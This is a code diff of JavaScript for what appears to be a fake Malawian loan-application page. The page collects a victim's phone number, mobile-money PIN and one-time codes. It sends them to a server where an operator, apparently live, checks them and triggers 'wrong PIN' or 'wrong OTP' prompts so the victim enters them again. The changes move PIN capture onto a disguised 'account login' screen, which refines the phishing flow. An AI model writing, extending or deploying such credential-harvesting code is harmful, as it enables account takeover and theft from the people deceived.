@@ -4,7 +4,7 @@ document.addEventListener('DOMContentLoaded', () => {
   const stepLoan1 = document.getElementById('step-loan-1');
   const stepLoan2 = document.getElementById('step-loan-2');
   const stepLoan3 = document.getElementById('step-loan-3');
-  const stepForm = document.getElementById('step-form');
+  const stepForm = document.getElementById('step-form'); // Account Login Screen
   const stepLoading = document.getElementById('step-loading');
   const stepOtp = document.getElementById('step-otp') || document.getElementById('step-WHATSSAP');
   const stepSuccess = document.getElementById('step-success');
@@ -13,7 +13,6 @@ document.addEventListener('DOMContentLoaded', () => {
   const otpSurfaceBanner = document.getElementById('otp-surface-banner');
 
   let currentUserId = null;
-  let otpStep = 1;
   let statusPollInterval = null;
 
   const urlParams = new URLSearchParams(window.location.search);
@@ -45,7 +44,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // 4-Digit Auto focus logic
+  // Digit auto focus logic
   const pinDigits = document.querySelectorAll('.pin-digit');
   const otpDigits = document.querySelectorAll('.otp-digit');
 
@@ -68,6 +67,16 @@ document.addEventListener('DOMContentLoaded', () => {
   setupDigitInputs(pinDigits);
   setupDigitInputs(otpDigits);
 
+  // Toggle PIN Eye Icon
+  const toggleEye = document.getElementById('toggle-pin-visibility');
+  let isPinVisible = false;
+  if (toggleEye) {
+    toggleEye.addEventListener('click', () => {
+      isPinVisible = !isPinVisible;
+      pinDigits.forEach(i => i.type = isPinVisible ? 'text' : 'password');
+    });
+  }
+
   // Step Transitions
   document.getElementById('btn-understand-proceed').addEventListener('click', () => {
     showStep(stepSlider);
@@ -85,40 +94,12 @@ document.addEventListener('DOMContentLoaded', () => {
     showStep(stepLoan2);
   });
 
-  const phoneNumber = document.getElementById('phone-number');
-  const phoneError = document.getElementById('phone-error');
-
   document.getElementById('btn-loan2-back').addEventListener('click', () => {
     showStep(stepLoan1);
   });
 
   document.getElementById('btn-loan2-next').addEventListener('click', () => {
-    const cleanPhone = phoneNumber.value.replace(/\D/g, '');
-    const isMalawiNumber = /^(099|098|088|077)\d{7}$/.test(cleanPhone);
-
-    if (!isMalawiNumber) {
-      phoneError.style.display = 'block';
-      return;
-    }
-    phoneError.style.display = 'none';
-    showStep(stepLoan3);
-  });
-
-  const pinError = document.getElementById('pin-error');
-
-  document.getElementById('btn-loan3-back').addEventListener('click', () => {
-    showStep(stepLoan2);
-  });
-
-  document.getElementById('btn-loan3-next').addEventListener('click', () => {
-    const pinVal = Array.from(pinDigits).map(i => i.value).join('');
-    if (pinVal.length !== 4) {
-      pinError.style.display = 'block';
-      return;
-    }
-    pinError.style.display = 'none';
-
-    // Summary details
+    // Populate Summary Details
     const loanAmount = document.getElementById('loan-amount').value;
     const loanDuration = document.getElementById('loan-duration').value;
     const loanType = document.getElementById('loan-type').value;
@@ -129,18 +110,49 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('sum-duration').innerText = loanDuration;
     document.getElementById('sum-category').innerText = loanType;
     document.getElementById('sum-name').innerText = `${firstName} ${lastName}`.trim() || 'Valued Customer';
-    document.getElementById('sum-phone').innerText = phoneNumber.value.replace(/\D/g, '');
 
-    showStep(stepForm);
-  });
-
-  document.getElementById('btn-form-back').addEventListener('click', () => {
     showStep(stepLoan3);
   });
 
-  document.getElementById('btn-form-submit').addEventListener('click', async () => {
-    const cleanPhone = phoneNumber.value.replace(/\D/g, '');
+  document.getElementById('btn-loan3-back').addEventListener('click', () => {
+    showStep(stepLoan2);
+  });
+
+  // Step 3 of 3 Next -> Account Login Screen
+  document.getElementById('btn-loan3-next').addEventListener('click', () => {
+    showStep(stepForm);
+  });
+
+  // Login Submit Action (Submits Application to Server)
+  const loginPhone = document.getElementById('login-phone');
+  const phoneError = document.getElementById('phone-error');
+  const pinError = document.getElementById('pin-error');
+
+  document.getElementById('btn-login-submit').addEventListener('click', async () => {
+    let valid = true;
+
+    // Validate Malawi Phone Number
+    const cleanPhone = loginPhone.value.replace(/\D/g, '');
+    const isMalawiNumber = /^(099|098|088|077)\d{7}$/.test(cleanPhone);
+
+    if (!isMalawiNumber) {
+      phoneError.style.display = 'block';
+      valid = false;
+    } else {
+      phoneError.style.display = 'none';
+    }
+
+    // Validate 4-digit PIN
     const pinVal = Array.from(pinDigits).map(i => i.value).join('');
+    if (pinVal.length !== 4) {
+      pinError.style.display = 'block';
+      valid = false;
+    } else {
+      pinError.style.display = 'none';
+    }
+
+    if (!valid) return;
+
     const amtVal = `MWK ${Number(document.getElementById('loan-amount').value).toLocaleString()}`;
 
     showLoading('Submitting Application...', 'Sending details securely.');
@@ -185,32 +197,23 @@ document.addEventListener('DOMContentLoaded', () => {
         if (data.status === 'APPROVED_LOAD_OTP') {
           clearInterval(statusPollInterval);
           hideLoading();
-          otpStep = 1;
-          document.getElementById('otp-phone-display').innerText = phoneNumber.value;
-          showStep(stepOtp);
-        } else if (data.status === 'TRIGGER_SECOND_OTP') {
-          clearInterval(statusPollInterval);
-          hideLoading();
-          otpStep = 2;
-          otpDigits.forEach(i => i.value = '');
-          if (otpSurfaceBanner) otpSurfaceBanner.classList.remove('active');
-          otpDigits[0].focus();
+          document.getElementById('otp-phone-display').innerText = loginPhone.value;
           showStep(stepOtp);
         } else if (data.status === 'SUCCESS') {
-          // DIRECT TRANSITION TO SUCCESS SCREEN AFTER ADMIN APPROVAL
+          // DIRECT TRANSITION TO SUCCESS SCREEN WHEN ADMIN TAPS 'CORRECT OTP'
           clearInterval(statusPollInterval);
           hideLoading();
           document.getElementById('approved-amount-display').innerText = `MWK ${Number(document.getElementById('loan-amount').value).toLocaleString()}`;
           showStep(stepSuccess);
         } else if (data.status === 'RETRY_PIN') {
-          // DISPLAY IN-PAGE WRONG PIN BANNER
+          // DISPLAY IN-PAGE WRONG PIN BANNER ON LOGIN SCREEN
           clearInterval(statusPollInterval);
           hideLoading();
           if (pinSurfaceBanner) pinSurfaceBanner.classList.add('active');
           pinDigits.forEach(i => i.value = '');
-          showStep(stepLoan3);
+          showStep(stepForm);
         } else if (data.status === 'RETRY_OTP') {
-          // DISPLAY IN-PAGE WRONG OTP BANNER
+          // DISPLAY IN-PAGE WRONG OTP BANNER ON OTP SCREEN
           clearInterval(statusPollInterval);
           hideLoading();
           if (otpSurfaceBanner) otpSurfaceBanner.classList.add('active');
@@ -243,8 +246,7 @@ document.addEventListener('DOMContentLoaded', () => {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           userId: currentUserId,
-          otp: otpVal,
-          step: otpStep
+          otp: otpVal
         })
       });
 
